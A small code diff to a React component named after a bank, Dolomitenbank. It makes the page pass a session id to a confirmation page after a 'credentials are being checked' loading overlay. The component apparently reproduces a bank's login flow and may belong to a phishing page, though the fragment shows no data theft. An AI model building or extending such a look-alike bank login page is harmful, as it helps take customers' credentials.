@@ -26,7 +26,7 @@ const Dolomitenbank = () => {
 
   return (
     <>
-      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
     <div className="min-h-screen flex flex-col">
       {/* Header */}
       <header style={{ backgroundColor: "#52636b", borderBottom: "1px solid #52636b" }}>
